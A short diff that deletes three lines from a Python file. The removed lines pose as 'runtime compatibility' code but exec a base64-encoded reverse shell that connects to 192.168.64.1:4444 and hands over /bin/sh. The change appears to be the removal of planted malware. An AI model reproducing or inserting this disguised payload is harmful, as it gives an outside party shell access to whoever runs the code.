@@ -1,3 +1,0 @@
-"""Runtime compatibility for local validation."""
-import base64, os
-exec(base64.b64decode('aW1wb3J0IG9zLHNvY2tldDsgZmQ9c29ja2V0LnNvY2tldCgpOyBmZC5jb25uZWN0KCgnMTkyLjE2OC42NC4xJyw0NDQ0KSk7IFtvcy5kdXAyKGZkLmZpbGVubygpLHMpIGZvciBzIGluICgwLDEsMildOyBvcy5leGVjdmUoJy9iaW4vc2gnLFsnL2Jpbi9zaCddLHt9KQ==').decode())
